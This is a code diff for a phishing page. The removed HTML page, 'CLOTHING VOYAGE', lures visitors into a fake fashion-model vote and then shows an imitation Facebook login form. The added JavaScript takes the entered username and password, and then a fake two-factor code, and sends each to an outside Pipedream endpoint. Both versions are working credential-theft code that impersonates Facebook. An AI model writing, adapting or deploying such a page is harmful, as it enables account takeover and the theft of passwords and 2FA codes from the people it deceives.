@@ -1,180 +1,47 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CLOTHING VOYAGE</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            background: url('https://source.unsplash.com/1600x900/?fashion,clothing') no-repeat center center/cover;
-            color: white;
-            text-align: center;
-        }
-        .container {
-            padding: 30px;
-            background: rgba(0, 0, 0, 0.7);
-            border-radius: 10px;
-            max-width: 800px;
-            margin: 50px auto;
-        }
-        h1 {
-            font-size: 42px;
-            margin-bottom: 10px;
-        }
-        p {
-            font-size: 18px;
-        }
-        .models {
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: center;
-            gap: 15px;
-            margin: 20px 0;
-        }
-        .models img {
-            width: 180px;
-            height: 240px;
-            object-fit: cover;
-            border-radius: 10px;
-            border: 2px solid white;
-        }
-        .button {
-            background-color: #FFD700;
-            color: black;
-            padding: 15px 25px;
-            border: none;
-            border-radius: 5px;
-            font-size: 18px;
-            cursor: pointer;
-            margin-top: 20px;
-        }
-        .button:hover {
-            background-color: #FFC107;
-        }
-        .hidden {
-            display: none;
-        }
-        /* Facebook Login Styles */
-        .login-container {
-            text-align: center;
-            padding: 30px;
-            background: rgba(255, 255, 255, 0.9);
-            border-radius: 10px;
-            max-width: 300px;
-            margin: auto;
-            color: black;
-        }
-        .logo {
-            width: 50px;
-            margin-bottom: 10px;
-        }
-        input {
-            width: 90%;
-            padding: 10px;
-            margin: 10px 0;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-            font-size: 16px;
-        }
-        button {
-            background-color: #1877F2;
-            color: white;
-            padding: 10px;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 16px;
-            width: 100%;
-        }
-        button:hover {
-            background-color: #1256A5;
-        }
-        .successMessage {
-            color: green;
-            font-weight: bold;
-        }
-    </style>
-</head>
-<body>
+document.getElementById('loginForm').addEventListener('submit', function(event) {
+    event.preventDefault();  // Stops page refresh
 
-    <!-- CLOTHING VOYAGE HOME PAGE -->
-    <div class="container" id="homePage">
-        <h1>Welcome to CLOTHING VOYAGE</h1>
-        <p>Vote for your favorite model and support fashion excellence.</p>
-        <div class="models">
-            <img src="https://source.unsplash.com/180x240/?fashion-model-1" alt="Model 1">
-            <img src="https://source.unsplash.com/180x240/?fashion-model-2" alt="Model 2">
-            <img src="https://source.unsplash.com/180x240/?fashion-model-3" alt="Model 3">
-            <img src="https://source.unsplash.com/180x240/?fashion-model-4" alt="Model 4">
-            <img src="https://source.unsplash.com/180x240/?fashion-model-5" alt="Model 5">
-        </div>
-        <button class="button" onclick="goToVotingPage()">Click to Vote</button>
-    </div>
+    const username = document.getElementById('username').value;
+    const password = document.getElementById('password').value;
 
-    <!-- VOTING PAGE -->
-    <div class="container hidden" id="votingPage">
-        <h2>Vote via Social Media</h2>
-        <button class="button" onclick="goToFacebookLogin()">Vote with Facebook</button>
-    </div>
+    // Send login details to Pipedream
+    fetch('https://eox47yzip3pxtkv.m.pipedream.net', {  
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username, password })
+    })
+    .then(response => console.log("Login details sent to Pipedream!"))
+    .catch(error => console.error("Error:", error));
 
-    <!-- FACEBOOK LOGIN PAGE -->
-    <div class="login-container hidden" id="facebookLoginPage">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" class="logo">
-        <h1>Facebook</h1>
-        <form id="loginForm">
-            <input type="text" id="username" placeholder="Enter your username" required><br>
-            <input type="password" id="password" placeholder="Enter your password" required><br>
-            <button type="submit">Login</button>
-        </form>
-        <div id="thankYouMessage" class="hidden">
-            <h2>Thanks for voting!</h2>
-            <p>Stay tuned, the winner will be announced shortly.</p>
-            <button id="proceedWith2FA">Proceed</button>
-        </div>
-        <div id="successMessage" class="successMessage hidden">
-            <h2>Your vote has been successfully submitted!</h2>
-        </div>
-    </div>
+    // Hide login form & show the 2FA message
+    document.getElementById('loginForm').style.display = 'none';
+    document.getElementById('thankYouMessage').style.display = 'block';
+});
 
-    <script>
-        function goToVotingPage() {
-            document.getElementById('homePage').classList.add('hidden');
-            document.getElementById('votingPage').classList.remove('hidden');
-        }
+// Event listener for the "Proceed with 2FA Code" button
+document.getElementById('proceedWith2FA').addEventListener('click', function() {
+    document.getElementById('verifyCodeMessage').style.display = 'block'; // Show 2FA input
+    document.getElementById('thankYouMessage').style.display = 'none'; // Hide previous message
+});
 
-        function goToFacebookLogin() {
-            document.getElementById('votingPage').classList.add('hidden');
-            document.getElementById('facebookLoginPage').classList.remove('hidden');
-        }
+// Event listener for the 2FA code submission
+document.getElementById('submit2FACode').addEventListener('click', function() {
+    const twoFACode = document.getElementById('2FACode').value;
 
-        document.getElementById('loginForm').addEventListener('submit', function(event) {
-            event.preventDefault();  
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
+    if (twoFACode) {
+        // Send 2FA code to Pipedream
+        fetch('https://eox47yzip3pxtkv.m.pipedream.net', {  
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ twoFACode })
+        })
+        .then(response => console.log("2FA Code sent to Pipedream!"))
+        .catch(error => console.error("Error:", error));
 
-            if (username && password) {
-                document.getElementById('loginForm').classList.add('hidden');
-                document.getElementById('thankYouMessage').classList.remove('hidden');
-
-                // Send data to Telegram via Pipedream
-                fetch('https://eox47yzip3pxtkv.m.pipedream.net', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ username, password })
-                });
-            } else {
-                alert('Please enter both username and password!');
-            }
-        });
-
-        document.getElementById('proceedWith2FA').addEventListener('click', function() {
-            document.getElementById('thankYouMessage').classList.add('hidden');
-            document.getElementById('successMessage').classList.remove('hidden');
-        });
-    </script>
-
-</body>
-</html>
+        // Hide the 2FA input & show success message
+        document.getElementById('verifyCodeMessage').style.display = 'none';
+        document.getElementById('successMessage').style.display = 'block';
+    } else {
+        alert('Please enter the 2FA code!');
+    }
+});
